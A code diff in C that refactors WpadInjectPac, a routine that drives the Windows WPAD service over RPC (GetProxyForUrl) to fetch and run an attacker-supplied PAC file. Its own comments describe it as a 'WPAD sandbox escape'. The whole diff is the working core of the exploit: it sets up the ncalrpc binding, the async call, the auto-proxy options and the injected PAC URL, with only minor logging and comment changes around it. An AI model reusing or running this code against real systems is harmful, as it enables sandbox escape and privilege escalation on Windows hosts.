@@ -26,9 +26,6 @@ void DebugLog(const wchar_t *Format, ...) {
     va_end(Args);
 
     //MessageBoxW(0, Buffer, L"WPAD escape", 0);
-    //OutputDebugString(L"\n");
-    //wprintf(buffer);
-    //wprintf(L"\n");
 #ifdef EXE_BUILD
     printf("%ws\r\n", Buffer);
 #endif
@@ -47,6 +44,10 @@ void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.
     free(ptr);
 }
 
+////////
+////////
+// Primary WPAD RPC logic
+////////
 
 RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     DWORD Int = 0;
@@ -78,24 +79,13 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
     wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
     wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);
+    DebugLog(L"... target PAC URL: %ws", AutoConfigUrl);
 
-    DebugLog(L"Target PAC URL: %ws", AutoConfigUrl);
-
-    /*
-    This structure contains the URL for which the proxy information
-    needs to be resolved.
-    */
-
-    ProxyResolveUrl.Url = L"http://www.google.com/";
+    ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
     ProxyResolveUrl.Domain = L"www.google.com";
     ProxyResolveUrl.Seperator = L"/";
     ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
     ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB
-
-    /*
-    This structure holds the flag and the path of Auto Configuration URL.
-    This is the URL from where the PAC file needs to be fetched.
-    */
 
     AutoProxyOptions.lpszAutoConfigUrl = AutoConfigUrl;
     AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;
@@ -112,141 +102,89 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     SessionOptions.dwTimeout3 = 0x00007530;
     SessionOptions.Member5 = 0x00000000;
 
-    /*
-    Create the string binding handle.
+    /* 
+    The RPC call to WPAD follows a simple pattern:
+       1. Create an RPC string binding handle on the ncalrpc protocol
+       2. Generate an RPC_BINDING_HANDLE (to be used in all future operations) from the string binding handle
+       3. Create an asynchronous RPC state handle which will be used for the actual call to GetProxyForUrl
+       4. Make the RPC call to GetProxyForUrl within the WPAD service and wait for its completion via the event object in its RPC async handle
     */
 
-    RpcStatus = RpcStringBindingComposeW(
-        0,
-        (RPC_WSTR)Protocol,
-        0,
-        0,
-        0,
-        &StringBinding
-    );
+    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)Protocol, 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol
 
-    if (RpcStatus == RPC_S_OK)
-    {
-        DebugLog(L"[+] RpcStringBindingCompose successful.");
-    }
-    else
-    {
-        DebugLog(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
-        return RpcStatus;
-    }
+    if (RpcStatus == RPC_S_OK) {
+        RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle
 
-    /*
-    Get the binding handle from string representation of the handle.
-    */
+        if (RpcStatus == RPC_S_OK) {
+            // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl
 
-    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding);
+            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));
 
-    if (RpcStatus == RPC_S_OK)
-    {
-        DebugLog(L"[+] RpcBindingFromStringBinding successful.");
-    }
-    else
-    {
-        DebugLog(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
-        return RpcStatus;
-    }
+            if (RpcStatus == RPC_S_OK) {
+                RpcAsyncState.UserInfo = NULL;
+                RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
+                RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state
 
-    /*
-    Initialize RPC_ASYNC_STATE which is going to be used during async operation.
-    */
+                RpcTryExcept
+                {
+                    /*
+                    Call the GetProxyForUrl interface method which is responsible for initiating
+                    the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
+                    */
 
-    RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));
+                    DebugLog(L"... calling GetProxyForUrl RPC method.");
 
-    if (RpcStatus == RPC_S_OK)
-    {
-        DebugLog(L"[+] RpcAsyncInitializeHandle successful.");
-    }
-    else
-    {
-        DebugLog(L"[-] RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
-        return RpcStatus;
-    }
+                    GetProxyForUrl(
+                        &RpcAsyncState,
+                        hRpcBinding,
+                        &ProxyResolveUrl,
+                        &AutoProxyOptions,
+                        &SessionOptions,
+                        0,
+                        NULL,
+                        &Int,
+                        &ProxyResult,
+                        &pNameResTrkRecordHandle,
+                        &WinHttpStatusCode
+                    );
 
-    /*
-    RPC run time can notify the client for the occurrence of an event using
-    different mechanisms.
+                    DebugLog(L"... GetProxyForUrl returned (async)");
+                }
+                RpcExcept(1) {
+                    DebugLog(L"... GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
+                }
+                RpcEndExcept
 
-    Reference: https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state
+                dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
 
-    If you do not want to get notified, you can comment the below code.
-    */
+                if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
+                    CloseHandle(RpcAsyncState.u.hEvent);
+                }
 
-    RpcAsyncState.UserInfo = NULL;
-    RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
-    RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
+                if (dwWaitResult == WAIT_OBJECT_0) {
+                    DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
+                    RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
+                }
+                else {
+                    DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
+                    RpcAsyncCancelCall(&RpcAsyncState, TRUE);
+                }
+            }
+            else {
+                DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
+            }
 
-    if (RpcAsyncState.u.hEvent == NULL)
-    {
-        DebugLog(L"[-] CreateEvent failed. Error: 0x%X", GetLastError());
-        return RpcStatus;
-    }
+            RpcBindingFree(&hRpcBinding);
+        }
+        else {
+            DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%X", RpcStatus);
+        }
 
-    RpcTryExcept
-    {
-        /*
-        Call the GetProxyForUrl interface method which is responsible for initiating
-        the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
-        */
-
-        DebugLog(L"[+] Calling GetProxyForUrl RPC method.");
-
-        GetProxyForUrl(
-            &RpcAsyncState,
-            hRpcBinding,
-            &ProxyResolveUrl,
-            &AutoProxyOptions,
-            &SessionOptions,
-            0,
-            NULL,
-            &Int,
-            &ProxyResult,
-            &pNameResTrkRecordHandle,
-            &WinHttpStatusCode
-        );
-
-        DebugLog(L"GetProxyForUrl returned (async)");
-    }
-        RpcExcept(1)
-    {
-        DebugLog(L"[-] GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
-    }
-    RpcEndExcept
-
-    if ((dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000)) == WAIT_OBJECT_0) {
-        DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
+        RpcStringFreeW(&StringBinding);
     }
     else {
-        DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
-        RpcAsyncCancelCall(&RpcAsyncState, TRUE);
-        CloseHandle(RpcAsyncState.u.hEvent);
-
-        return RpcStatus;
+        DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
     }
-
-    if (RpcAsyncState.u.hEvent != NULL)
-    {
-        CloseHandle(RpcAsyncState.u.hEvent);
-    }
-
-    /*
-    Complete the asynchronous RPC call.
-    */
-
-    RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
-
-    /*
-    Free up the resources.
-    */
-
-    RpcStringFreeW(&StringBinding);
-    RpcBindingFree(&hRpcBinding);
-
-    DebugLog(L"... WPAD sandbox escape completed. Returning back to original thread...");
 
     return RpcStatus;
 }
